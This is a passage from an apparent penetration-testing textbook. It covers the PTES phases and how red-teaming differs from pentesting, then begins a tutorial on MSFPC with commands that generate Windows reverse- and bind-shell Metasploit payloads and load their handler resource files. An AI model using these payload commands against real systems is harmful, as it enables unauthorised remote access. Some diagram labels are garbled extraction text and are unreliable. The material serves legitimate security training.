> usually involves mapping the network IPs, web applications, wireless
> networks, and so on.
>
> Once the scoping is done, lines of communication are established
> across both the vendors and the incident reporting process is
> finalized. These interactions also include status updates, calls,
> legal processes, and the start and end dates of the project.
# Intelligence gathering
> This is a process that is used to gather as much as information as
> possible about the target. This is the most critical part of
> pentesting, as the more information we have, the more attack vectors
> we can plan to perform the activity. In case of a whitebox activity,
> all this information is already provided to the testing team.
# Threat modeling
> Threat modeling model depends on the amount of information gathered.
> Depending on that, the activity can be divided and then performed
> using automated tools, logical attacks, and so on. The following
> diagram illustrates an example of a mindmap of a threat model:
>
> ![](media/image62.jpeg)
# Vulnerability analysis
> This is a process of discovering flaws that can be used by an
> attacker. These flaws can be anything ranging from open ports/service
> misconfiguration to an SQL injection. There are lots of tools
> available that can help in performing a vulnerability analysis.
>
> These include Nmap, Acunetix, and Burp Suite. We can also see new
> tools being released every few weeks.
# Exploitation
> This is a process of gaining access to the system by evading the
> protection mechanism on the system based on the vulnerability
> assessment. Exploits can be public, or a zero day.
# Post-exploitation
> This is a process where the goal is to determine the criticality of
> the compromise and then maintain access for future use. This phase
> must always follow the rules of the engagement that is protecting the
> client and protecting ourselves (covering the tracks as per the
> activity\'s requirements).
# Reporting
> This is one of the most important phases, as the patching of all the
> issues totally depends on the details presented in the report. The
> report must contain three key elements:
>
> Criticality of the bug
>
> Steps of reproduction of the bug Patch suggestions
In summary, the pentest life cycle phases are presented in the following
diagram:
> ![](media/image63.jpeg)
# A different approach
> Let\'s discuss a different approach: red-teaming. The main objective
> of red- teaming is to assess and obtain the real level of risk a
> company has at that moment in time. In this activity, networks,
> applications, physical, and people (social engineering) are tested
> against weaknesses.
Red-teaming can also be considered as a simulation of a real-world hack.
# Methodology
> Red-teaming is based on the PTES standard as the foundation. However,
> there\'s much more to it. It can be said that the penetration testing
> activity is performed with the aim of finding as many vulnerabilities
> in the given amount of time as possible. However, red-teaming is
> performed with only one goal and by staying discreet.
>
> The methodology used in a red-team activity involves the following:
>
> Reconnaissance Compromise Persistence
>
> Command and control Privilege escalation Pivoting
>
> Reporting and cleanup
The following cycle basically repeats for every new piece of information
that is found about the client until the goal is met:
> ![](media/image64.jpeg)
>
> ![](media/image65.png)
>
> ![](media/image66.jpeg)
P rT vilige
Escalation
> Rpo
>
> nd
>
> np
>
> Reconnaissance
>
> ![](media/image67.jpeg)
>
> ![](media/image68.png)
>
> ![](media/image69.jpeg)
>
> Persistance
And
ind
> ![](media/image70.jpeg)Control
# How is it different?
> Let\'s look at it with a different perspective to get a clearer
> picture:
>
> ![](media/image72.jpeg)
>
> Looking at the preceding diagram, we can see that red-teaming involves
> using every means to achieve the goals. We can summarize the major
> difference between red-teaming and pentesting as follows:
>
> Red-teaming involves finding and exploiting only those vulnerabilities
> that help to achieve our goal, whereas pentesting involves finding and
> exploiting vulnerabilities in the given scope, which is limited to
> digital assets
>
> Red-teaming has an extremely flexible methodology, whereas pentesting
> has fixed static methods
>
> During red-teaming, the security teams of the organizations have no
>
> information about it, whereas during pentesting, security teams are
> notified Red-teaming attacks can happen 24/7, while pentesting
> activities are mostly limited to office hours
>
> Red-teaming is more about measuring the business impact of the
> vulnerabilities, whereas pentesting is about finding and exploiting
> vulnerabilities.
# Summary
> Wrapping up the chapter, we learned about different standards of
> pentesting followed across the industry, and we went through the seven
> phases of the PTES standard in detail. We also looked at red-teaming
> and how it is different from pentesting.
>
> In the next chapter, we will look at a few of the latest
> post-exploitation tools and examine in detail how they work.
# Questions
1.  What are the different pentesting standards?
2.  What are the different phases of PTES?
3.  What is the difference between red-teaming and pentesting?
4.  What are the key elements of a report?
5.  What is the main objective of a red-team activity?
# Further reading
> For more information on the topics discussed in this chapter, please
> visit the following links:
>
> **High Level Organization of the Standard**:
> [http://www.pentest-standard.org/in
> dex.php/Main_Page](http://www.pentest-standard.org/index.php/Main_Page)
>
> **OSSTMM**: 
>
> **Web Application Penetration Testing**:
> [https://www.owasp.org/index.php/Web_App
> lication_Penetration_Testing](https://www.owasp.org/index.php/Web_Application_Penetration_Testing)
## Information Systems Security Assessment Framework (ISSAF): [http://w](http://www.oissg.org/issaf02/issaf0.1-5.pdf)
> [ww.oissg.org/issaf02/issaf0.1-5.pdf](http://www.oissg.org/issaf02/issaf0.1-5.pdf)
>
> **InfoSec Resources**:
> [https://resources.infosecinstitute.com/the-history-of-penetra
> tion-testing/#gref](https://resources.infosecinstitute.com/the-history-of-penetration-testing/#gref)
# Pentesting 2018
> For the past few years, we have been using tools such as the
> Metasploit Framework, routersploit, LinuxEnum.sh, nmap, and so on for
> post-exploitation and scanning. With the growing popularity of new
> tools, it would be good to learn about some new tools that can be used
> for post-exploitation. Out of the many available tools, we will be
> looking at **MSFvenom Payload Creator** (**MSFPC**)
>
> ---a simple MSF-based payload generator; and Koadic---a **COM-based
> Command and Control** (**C3**) server, which can be used in red-team
> operations or penetration testing for post-exploitation.
In this chapter, we will cover the following tools:
> MSFPC
>
> Kaodic
# Technical requirements
> \*nix-based system (Kali, Ubuntu, or macOS X) The Metasploit framework
> (needed for MSFPC) Python package version 2 or 3 (needed for Koadic)
# MSFvenom Payload Creator
> MSFvenom Payload Creator (MSFPC) is a user-friendly multiple payload
> generator that can be used to generate Metasploit payloads based on
> user- selected options. The user doesn\'t need to execute the long
> msfvenom commands to generate payloads anymore. With MSFPC, the user
> can generate the payloads with far fewer commands.
>
> Before downloading the tool, Metasploit should be installed in the
> system. MSFPC is just a simple bash script, which means that it can be
> executed on \*nix systems.
We can download the MSFPC package from .
We can either download the repository in a ZIP file or we can clone the
repository on our local system by running the following command:
> ![](media/image73.jpeg)**git clone https://github.com/g0tmi1k/mpc**
After cloning the repo, let\'s issue an execute permission on msfpc.sh
file.
> **cd mpc/**
>
> **chmod +x msfpc.sh**
>
> **./msfpc.sh**
>
> **./msfpc.sh \ (\) (\) (\)
> (\) (\
> ![](media/image74.jpeg)
>
> TYPE: The payload could be of any of the following formats (this
> option is the same as the -f switch in msfvenom): APK \[android\],
> ASP, ASPX, Bash \[.sh\], Java \[.jsp\], Linux \[.elf\], OSX
> \[.macho\], Perl \[.pl\], PHP, Powershell \[.ps1\], Python \[.py\],
> Tomcat \[.war\], Windows \[.exe //.dll\].
>
> DOMAIN/IP: This is the LHOST option when generating payloads in
> msfvenom. PORT: This is the LPORT option when generating payloads in
> msfvenom.
>
> CMD/MSF: This is the type of shell dropped once the payload is
> executed on the target system. The CMD option can be used when you
> want to get a standard command shell; that is, the Command Prompt
> shell (cmd.exe) for Windows and Terminal (/bin/bash) for \*nix. In
> some cases, where the size of the shellcode matters, it\'s better to
> use the classic reverse shell payload. CMD can be used in situations
> like these.
Generating a simple classic reverse shell payload can be done by
executing the following command:
> **sh msfpc.sh cmd windows en0**
The preceding command will generate a payload with a cmd as the
preferred shell for Windows and set the LHOST to the IP retrieved from
the en0 Ethernet interface:
> ![](media/image75.jpeg)
As you can see from the preceding screenshot, MSFPC created two files in
the same directory:
> **The executable payload**: windows-shell-staged-reverse-tcp-443.exe
>
> **The resource file**: windows-shell-staged-reverse-tcp-443-exe.rc
>
> The naming convention for the files are easy to understand as they are
> named after the options used while creation. We just created a
> **Windows staged**
>
> (explained later in this chapter) executable when executed on the
> target server will connect back to our system (**reverse** connection)
> on our local port **443** and drop us a command prompt **shell.**
> Hence, **windows-shell-staged-reverse-tcp- 443.exe.** It is preferred
> to have a reverse shell instead of a bind shell (explained in the
> further chapters)
# Resource file
> As explained in the documentation of Metasploit
> ([https://metasploit.help.rapid7.com](https://metasploit.help.rapid7.com/docs/resource-scripts)
>
> [/docs/resource-scripts), resource scripts provide an easy way for you
> to automate](https://metasploit.help.rapid7.com/docs/resource-scripts)
> repetitive tasks in Metasploit. Conceptually, they\'re just like batch
> scripts. They contain a set of commands that are automatically and
> sequentially executed when you load the script in Metasploit. You can
> create a resource script by chaining together a series of Metasploit
> console commands and by directly embedding Ruby to do things such as
> call APIs, interact with objects in the database, and iterate actions.
Let\'s check out the .rc file generated by MSFPC in the preceding
command:
> ![](media/image76.jpeg)
>
> The payload is set to windows/shell/reverse_tcp when the CMD option is
> used.
>
> The msf option generates the payload with a custom cross-platform
> shell that uses the full potential of Metasploit: **sh msfpc.sh msf
> windows en0**
>
> ![](media/image77.jpeg)
>
> If you look at the .rc file generated from MSFPC when the msf option
> is used, you\'ll see the difference in the payload used by the payload
> handler:
>
> ![](media/image78.jpeg)
>
> The payload is set to windows/meterpreter/reverse_tcp when the MSF
> option is used. The resource file can be executed with msfconsole,
> using the following command: **msfconsole -q -r
> \'windows-meterpreter-staged-reverse-tcp-443-exe.rc\'**
Where:
> -q is used for quiet mode (no good looking for the MSF banner)
>
> -r is used for the resource file
>
> ![](media/image79.jpeg)
Once the payload is executed, the **stager** will request for other
parts of the payload to be sent over to the target server. These parts
of the payload will be sent by payload handler and the complete staged
payload is delivered to the victim:
> ![](media/image80.jpeg)
>
> Note: The payload we used in the preceding image is x86 based but the
> system is x64 architecture. It\'s recommended that the payload should
> either match the
>
> same architecture as the operating system. In Metasploit we can either
> migrate from x86 based process to x64 based process or we can use the
> Metasploit post module post/windows/manage/archmigrate to migrate from
> x86 to x64 architecture.
>
> BIND/REVERSE: The type of connection to be made once the payload is
> executed on the target system.
>
> BIND: This shell connection will open a port on the target server and
> connect to it. To get a BIND connection is very rare as ingress
> (incoming) firewall rules block the ports on the target server.
>
> **./msfpc.sh bind msf windows en0**
>
> The preceding command will generate a Windows meterpreter payload,
> which will open a port on the target server and listen for a bind
> connection from our payload handler once the payload is executed. The
> port may not be accessible for connection due to firewall. In this
> situation, we can opt for reverse shell
>
> payloads which will bypass the firewall ruleset for outgoing
> connection and connect back to our system.
>
> ![](media/image81.jpeg)
>
> Out of the two files generated by MSFPC, let\'s check out the .rc file
> for this:
>
> ![](media/image82.jpeg)
>
> The payload is set to windows/meterpreter/bind_tcp instead of
> reverse_tcp, which shows that the payload handler will use a BIND
> connection to connect to the target server.
>
> REVERSE: This shell connection will open a port on the attacker
> machine.
>
> Once the payload is executed, the target server will connect back to
> the attacker. To get a REVERSE connection is a very good way of
> bypassing ingress firewall blocks but this method can be blocked if
> egress (outbound) firewall rules are in place. By default, MSFPC will
> generate the payload with the REVERSE shell connection.
>
> STAGED/STAGELESS: The type of payload to be used.
>
> STAGED: This is the payload type that sends the payload in multiple
> stages, which makes it smaller in size but it relies on Metasploit\'s
> payload handler for sending the remainder of the parts to the target
> server. By default, MSFPC will generate a staged payload.
>
> STAGELESS: This is a complete payload and is more stable and reliable
> than the STAGED payload but the size of this kind of payload is way
> too much in comparison to STAGED:
>
> **./msfpc.sh cmd stageless bind windows en0**
>
> The preceding command will generate a stageless windows executable
> payload when executed. It will open a port on the target system and
> listen for a BIND
>
> connection to get a standard Command Prompt:
>